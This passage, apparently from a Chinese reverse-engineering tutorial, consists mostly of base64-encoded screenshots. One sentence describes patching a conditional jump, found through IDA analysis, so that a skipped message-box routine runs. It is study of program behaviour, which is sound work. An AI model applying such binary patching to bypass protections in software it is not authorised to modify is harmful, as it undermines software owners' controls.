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
epIdOwAAAABJRU5ErkJggg=='/></p>
<p>发现这个跳转会跳过第一个调用消息框的模块，运行第二个，这和刚刚在ida内的分析吻合，第一个消息框函数前面确实有一些其他东西，修改这个跳转使其不能实现，走一下上面这个消息框</p>
<p><img src='data:img/jpg;base64,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
